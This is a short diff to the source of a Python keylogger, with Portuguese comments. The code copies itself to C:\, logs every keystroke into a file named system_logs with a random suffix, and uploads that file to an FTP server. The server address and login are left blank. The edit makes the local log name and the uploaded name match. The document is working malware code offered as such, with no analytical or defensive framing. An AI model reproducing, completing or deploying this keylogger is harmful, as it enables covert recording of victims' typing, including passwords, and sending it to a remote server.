@@ -15,6 +15,8 @@ def num():
    print(a * 2) 
 '''
 
+a = random.randint(0, 99999999999999)
+
 def copy(): # Copia o Keylogger para C:\\
      try:
           files = ("C:\\")
@@ -25,8 +27,8 @@ def copy(): # Copia o Keylogger para C:\\
            
 def ftp(): #Função para Upar o 
      try:
-          a = random.randint(0, 99999999999999)
-          files = ("system_logs" + str(a) +".txt") #Upa este arquivo para o servidor FTP
+          
+          files = ("system_logs-" + str(a) +".txt") #Upa este arquivo para o servidor FTP
           user = "" #User do FTP
           passw = "" #Pass do FTP
           ftp = ftplib.FTP("") #Server do FTP
@@ -46,7 +48,7 @@ ftp()
 
 def keyevent(event): # Inicia o evento para gravar as teclas, o programa não filtra nenhuma tecla, cabe ao usuario corrigir os erros :)
      try:
-          files = ("C:\\system_logs.txt") #Escreve o que foi gravado no system_logs.txt no diretório C:\\
+          files = ("C:\\system_logs-"+ str(a) +".txt") #Escreve o que foi gravado no system_logs.txt no diretório C:\\
           fp = open(files, "a")
           fp.write(("\n"+event.Key))
           fp.close()
